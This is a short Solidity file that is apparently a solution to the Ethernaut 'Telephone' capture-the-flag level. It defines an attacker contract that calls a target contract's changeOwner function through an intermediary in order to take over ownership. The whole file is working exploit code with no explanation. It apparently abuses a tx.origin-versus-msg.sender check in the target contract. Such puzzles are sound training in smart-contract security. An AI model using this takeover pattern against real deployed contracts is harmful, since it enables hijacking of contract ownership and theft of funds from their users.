// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface TelephoneInterface {
    function changeOwner(address _owner) external;
}

contract TelephoneOwnership {
    function takeoverTelephone(address _targetContract, address _newOwner) public{
        TelephoneInterface ti = TelephoneInterface(_targetContract);
        ti.changeOwner(_newOwner);
    }
}
